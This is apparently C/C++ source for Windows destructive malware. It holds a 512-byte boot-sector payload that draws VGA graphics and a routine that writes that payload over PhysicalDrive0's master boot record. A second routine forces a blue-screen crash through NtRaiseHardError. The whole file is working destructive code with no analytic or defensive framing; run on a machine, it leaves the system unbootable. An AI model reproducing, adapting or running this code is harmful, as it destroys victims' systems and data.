#include "main.h"
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);
const unsigned char mbrBytes[] = {
0x31, 0xDB, 0x8E, 0xDB, 0xBC, 0x00, 0x7C, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xC0, 0x8E,
0xC0, 0xBF, 0x00, 0x7E, 0xB9, 0x00, 0x02, 0xF3, 0xAA, 0xFF, 0x06, 0x20, 0x7E, 0xD9, 0x06, 0x00, 0x7E, 0xD8,
0x06, 0xD7, 0x7D, 0xD9, 0x16, 0x00, 0x7E, 0xD9, 0xFB, 0xD9, 0x1E, 0x08, 0x7E, 0xD9, 0x1E, 0x04, 0x7E, 0xD9,
0x06, 0xD3, 0x7D, 0xD8, 0x06, 0xD7, 0x7D, 0xD9, 0x16, 0xD3, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0x10, 0x7E, 0xD9,
0x1E, 0x0C, 0x7E, 0xBB, 0x00, 0x30, 0xB0, 0x7F, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0x30, 0xC0,
0xBB, 0x00, 0x20, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0xBB, 0xCF, 0xFF, 0xD9, 0x06, 0x00, 0x7E,
0xD9, 0xFE, 0xD8, 0x0E, 0xDB, 0x7D, 0xDF, 0x1E, 0x22, 0x7E, 0x8B, 0x0E, 0x22, 0x7E, 0x83, 0xC1, 0x32, 0xBD, 0x63,
0x00, 0xB8, 0x16, 0xFE, 0xBA, 0xDE, 0x03, 0xBE, 0x04, 0x00, 0xE8, 0x3D, 0x00, 0x87, 0xD9, 0xF7, 0xDB, 0x4E, 0x75,
0xF6, 0xBE, 0x05, 0x00, 0x91, 0xF7, 0xD9, 0xE8, 0x2D, 0x00, 0xBE, 0x06, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x23,
0x00, 0x91, 0xF7, 0xD9, 0x40, 0x4A, 0x75, 0xD9, 0x43, 0x4D, 0x75, 0xCF, 0x1E, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0xB8,
0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xF6, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xA4, 0x1F, 0xE9, 0x50, 0xFF, 0x66, 0x60, 0xA3,
0x14, 0x7E, 0x89, 0x1E, 0x18, 0x7E, 0x89, 0x0E, 0x1C, 0x7E, 0xDF, 0x06, 0x14, 0x7E, 0xD9, 0x1E, 0x14, 0x7E, 0xDF, 0x06,
0x18, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDF, 0x06, 0x1C, 0x7E, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x06, 0x04, 0x7E, 0xD9, 0x06,
0x08, 0x7E, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0x06, 0x18, 0x7E,
0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDD, 0xD8,
0xDD, 0xD8, 0xD9, 0x06, 0x0C, 0x7E, 0xD9, 0x06, 0x10, 0x7E, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8,
0xCB, 0xDE, 0xC1, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0xC0, 0xD8, 0x0E,
0xCB, 0x7D, 0xDF, 0x1E, 0x1C, 0x7E, 0xD8, 0x06, 0xC7, 0x7D, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xF1, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF,
0x1E, 0x18, 0x7E, 0xDE, 0xF9, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF, 0x1E, 0x14, 0x7E, 0xDD, 0xD8, 0xDD, 0xD8, 0x8B, 0x3E, 0x20, 0x7E,
0xC1, 0xEF, 0x04, 0x01, 0xFE, 0x83, 0xE6, 0x0F, 0x8A, 0x9C, 0xDF, 0x7D, 0x8B, 0x36, 0x14, 0x7E, 0x8B, 0x3E, 0x18, 0x7E, 0x81,
0xC6, 0xA0, 0x00, 0x83, 0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2C, 0x85, 0xF6, 0x78, 0x28, 0x81, 0xFF, 0xC8, 0x00, 0x7D,
0x22, 0x85, 0xFF, 0x78, 0x1E, 0x69, 0xFF, 0x40, 0x01, 0x01, 0xF7, 0xB9, 0x00, 0x30, 0xBE, 0x00, 0x20, 0xA0, 0x1C, 0x7E, 0x8E,
0xC1, 0x26, 0x3A, 0x05, 0x7D, 0x08, 0x26, 0x88, 0x05, 0x8E, 0xC6, 0x26, 0x88, 0x1D, 0x8E, 0xC6, 0x66, 0x61, 0xC3, 0x00, 0x00,
0x00, 0x40, 0x00, 0x00, 0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20, 0x43, 0x00, 0x00, 0x00, 0x40, 0x0A, 0xD7, 0xA3, 0x3B,
0x00, 0x00, 0x70, 0x41, 0x20, 0x22, 0x23, 0x25, 0x26, 0x27, 0x28, 0x2A, 0x2C, 0x2D, 0x2F, 0x30, 0x32, 0x34, 0x36, 0x37, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
VOID WINAPI mbr() {
	DWORD dw;
	HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(mbr, mbrBytes, 512, &dw, 0);
	CloseHandle(mbr);
}
VOID WINAPI bsod() {
	ULONG r = NULL;
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	if (!ntdll) return;

	pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
	NtRaiseHardError(0xDEAD666, 0, 0, 0, 6, &r);
}